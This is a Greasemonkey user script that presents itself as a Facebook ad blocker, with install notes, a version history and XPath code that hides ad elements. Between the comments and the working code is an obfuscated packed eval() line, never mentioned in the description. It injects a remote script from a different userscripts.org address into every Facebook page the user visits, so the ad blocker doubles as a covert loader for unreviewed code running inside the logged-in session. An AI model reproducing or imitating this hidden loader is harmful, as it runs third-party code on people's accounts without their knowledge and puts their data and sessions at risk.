// Facebook Ad Killer
//
// Does a simple remove of the advert elements on facebook
// from UserScripts.org
// http://userscripts.org/scripts/show/30392
//
// This is a Greasemonkey user script
// Requires Greasemonkey Version >= 0.8
//
// To install, you need Greasemonkey, get it from: http://www.greasespot.net
// Then restart Firefox and revisit this script.
// Under Tools, there will be a new menu item to "Install User Script".
// Accept the default configuration and install.
//
// To uninstall, go to Tools/Manage User Scripts,
// select "Facebook Ad Killer", and click Uninstall.
//
//
// --------------------------------------------------------------------------
// If anyone knows how to hack the layout (css?)
// to utilise the empty space then let me know
// gareth <dot> doutch <at> gmail <dot> com
// cheers
// --------------------------------------------------------------------------
// ==UserScript==
// @name           Facebook Ad Killer Plus
// @namespace      http://userscripts.org/scripts/show/30392
// @description    Block Facebook Adverts
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @include        *facebook.com/*
// ==/UserScript==
//
// --------------------------------------------------------------------------
// VERSION HISTORY:
//
// Ver 2.0
// Rebrand to "Facebook Ad Killer" as the layout isn't new anymore.
// Use the other (better) fb ad killer: http://userscripts.org/scripts/show/13787
// and
// Update to remove new style ad naming that fb introduced (Hat tip to Josh)
//
// Ver 1.9 
// Hide the sidebar instead of remove to prevent the layout screwing up
//
// Ver 1.8
// Switched to a single removeEmbeddedAds() function for removing all ads
// found by class='something to do with ads' inside every <div> element on the page
// This is because facebook updated their ad insertion method on the home_sidebar
//
// Ver 1.7
// the nice one-liner in v1.6 was leaking ads
// so back to a modified 1.5
//
// Ver 1.6
// Simplified greatly with code pinched and modified from a comment on
// http://userscripts.org/scripts/show/30527
//
// Ver 1.5:
// Added class name to catch more feed ads -
// expect this to grow as more come along.
// Fix made for the home page sidebar sponsor removal
// that wasn't working too great before
// It seems that document.addEventListener("DOMNodeInserted", removeAds, true)
// works after all. There were rumours of a bug, I don't know what it is.
//
// Ver 1.4:
// Added another little function to remove the sponsored ad that resides
// within the main page right-hand-side updates container
//
// Ver 1.3:
// A simple function loops over your news feed to remove sponsored ads
// Inserted the code for document.addEventListener("DOMNodeInserted", removeAds, true);
// 
// Ver 1.2:
// This is a simple hack to aid your sanity
// if any ads re-appear as they tend to do
// just click your mouse (anywhere - not on
// the ad!) and they go away again.
// This is a quick temp fix until 
// document.addEventListener("DOMNodeInserted", removeAds, true);
// becomes supported in a future version of GreaseMonkey
// --------------------------------------------------------------------------
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



function Remove_All_Facebook_Ads() {

	var sidebar_ads = document.getElementById('sidebar_ads');
	if (sidebar_ads && sidebar_ads.style.visibility != 'hidden') { //Prevents the visibility from being set multiple times unnecessarily
		//GM_log("Removing Facebook sidebar ads.");
		sidebar_ads.style.visibility = 'hidden';
	}

  	var elements = document.evaluate(
		"//div[contains(@class, 'emu_ad')] | //div[contains(@class, 'emu_sponsor')] | //div[contains(@class, 'fadbar')] | //div[contains(@class, 'profile_sidebar_ads')] | //div[contains(@class, 'ad_capsule')] | //div[contains(@class, 'social_ad')] | //div[contains(@class, 'sponsor')] | //div[contains(@id, 'sponsor')]",
		document,
		null,
		XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE,
		null
	);

	for (var i = 0; i < elements.snapshotLength; i++) {
		var thisElement = elements.snapshotItem(i);
		//GM_log("Removing Facebook ad element with class='" + thisElement.className + "' and id='" + thisElement.id + "'.");
    	thisElement.parentNode.removeChild(thisElement);
	}

}

document.addEventListener("DOMNodeInserted", Remove_All_Facebook_Ads, true);